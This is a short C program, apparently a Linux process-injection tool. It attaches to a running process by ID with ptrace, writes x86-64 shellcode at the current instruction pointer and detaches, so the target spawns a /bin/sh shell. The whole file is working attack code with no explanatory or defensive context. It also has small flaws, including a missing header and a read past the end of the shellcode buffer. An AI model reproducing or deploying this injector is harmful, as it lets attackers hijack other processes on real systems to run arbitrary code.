#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>

unsigned char shellcode[] = 
"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main(int argc, char *argv[]) {
    if(argc!=2) { printf("Usage: %s <pid>\n",argv[0]); return 1; }
    pid_t pid = atoi(argv[1]);

    ptrace(PTRACE_ATTACH,pid,0,0);
    waitpid(pid,NULL,0);

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS,pid,0,&regs);

    for(size_t i=0; i<sizeof(shellcode); i+=8)
        ptrace(PTRACE_POKETEXT,pid,regs.rip+i,*(unsigned long*)(shellcode+i));

    regs.rax=0;
    ptrace(PTRACE_SETREGS,pid,0,&regs);

    ptrace(PTRACE_DETACH,pid,0,0);
    return 0;
}
